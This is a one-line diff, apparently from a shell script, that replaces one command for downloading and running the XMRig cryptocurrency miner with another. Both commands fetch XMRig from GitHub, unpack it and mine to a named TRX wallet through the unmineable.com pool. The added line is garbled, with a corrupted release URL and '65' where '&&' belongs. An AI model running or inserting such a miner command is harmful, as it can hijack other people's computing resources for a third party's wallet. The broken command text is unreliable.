@@ -1,1 +1,1 @@
-wget https://github.com/xmrig/xmrig/releases/download/v6.19.2/xmrig-6.19.2-linux-x64.tar.gz && tar -xvf xmrig-6.19.2 && ./xmrig -a rx -o stratum+tcp://rx.unmineable.com:3333 -u TRX:TY1WNvX3Yms4nF7yyA6CbmQQ8uS1BLJe4m.awfulboy#0hl3-zs7g -p x
+wget https://github.com/xmrig/xmrigaleases/download/v6.17.0/xmrig-6.17.0-linux-x64.tar.gz && tar -xvf xmrig-6.17.0-linux-x64.tar.gz && cd xmrig-6.17.0 65./xmrig -o rx.unmineable.com:3333 -a rx -k -u TRX:TY1WNvX3Yms4nF7yyA6CbmQQ8uS1BLJe4m.awfulboy#0hl3-zs7g -p x
